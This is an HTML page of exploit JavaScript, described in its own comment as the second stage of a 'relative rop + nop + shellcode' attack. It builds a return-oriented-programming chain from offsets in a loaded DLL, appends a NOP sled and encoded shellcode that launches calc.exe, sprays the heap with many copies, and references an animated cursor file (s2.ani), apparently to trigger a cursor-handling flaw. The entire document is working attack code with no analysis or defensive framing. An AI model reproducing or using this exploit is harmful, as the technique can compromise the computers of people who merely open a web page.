<html>
<meta id='set'>
<script type="text/javascript">

/* 
  Stage 2 - relative rop + nop + shellcode 
*/

var hold  = document.getElementById('set');


function w2a(str) { 
 
     arr = str.split('');
     ret = '%u'+ arr[4]+arr[5]+arr[6]+arr[7]+
           '%u'+arr[0]+arr[1]+arr[2]+arr[3];
     return unescape(ret);

}


function heaps() {

  var base = parent.window.baseDll;
      base = '0x' + base.toString(16) + '0000';

  base = parseInt(base);

  CollectGarbage();

  rops = [ 
          base + 0x6c0a,
          base + 0x3A140,
          base + 0x3591F,
          base + 0x6C0A,
          base + 0x3A140, 
          base + 0x130EA,
          base + 0x6C0B, 
          base + 0x36069, 
          base + 0x36402,
          base + 0x5C30,
          base + 0x6C0A,  
          base + 0x11E05,
          base + 0x14901, 
          base + 0x5255,  
          base + 0x12174, 
          base + 0xD201,  
          base + 0x4B001,  
          base + 0xB8D7,
          base + 0xB8D8,   
          base + 0x4F87,   
          base + 0x11EB1,  
          base + 0x6C0A,
          base + 0x38C81
         ];

  
  var shell = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b'+   //199
                       '%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf'+
                       '%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101'+
                       '%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff'+
                       '%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b'+
                       '%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444'+
                       '%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01'+
                       '%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668'+
                       '%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f'+
                       '%u5300%ud5ff%u7473%u7261%u2074%u6163%u636c%u652e%u6578%u4100');

  var nops = unescape('%u9090%u9090');
 
  while(nops.length < 189) nops += nops;

  var code = w2a(rops[0].toString(16)) +   //124 ; fix:
             w2a(rops[1].toString(16)) +
             w2a(rops[2].toString(16)) +
             unescape('%u4141%u4141') +
             w2a(rops[3].toString(16)) +
             w2a(rops[4].toString(16)) +
             w2a(rops[5].toString(16)) +
             w2a(rops[6].toString(16)) +
             w2a(rops[7].toString(16)) +
             unescape('%u4141%u4141') +
             unescape('%u4141%u4141') +
             unescape('%u4141%u4141') +
             w2a(rops[8].toString(16))  +
             w2a(rops[9].toString(16))  +
             w2a(rops[10].toString(16)) +
             w2a('fffffdff')          +
             w2a(rops[11].toString(16)) +
             w2a(rops[12].toString(16)) +
             w2a('ffffffff')          +
             w2a(rops[13].toString(16)) +
             w2a(rops[14].toString(16)) +
             w2a(rops[15].toString(16)) +
             w2a(rops[16].toString(16)) +
             w2a(rops[17].toString(16)) + 
             w2a(rops[18].toString(16)) +
             w2a(rops[19].toString(16)) +
             w2a('ffffffc0')          +
             w2a(rops[20].toString(16)) +
             w2a(rops[22].toString(16)) +
             w2a('90909090')          +
             w2a(rops[21].toString(16)) +
             nops +
             shell;


    while (code.length < 100000)
        code = code + code;

    var block = code.substr(0, 64*1024/2);

    for (i=0; i<14; i++) {
        block += code.substr(0, 64*1024/2);
    }

    block += code.substr(0, (64*1024/2)-(38/2));

    var heaps = new Array();

    for (i=0; i<120; i++) {
        heaps[i] = block.substr(0, block.length);
    }


  hold.setAttribute('skwokdowkdokwod',heaps);
}


heaps();


</script>
</meta>
<body id='expme' style="CURSOR: url('s2.ani')">


</body>
</html>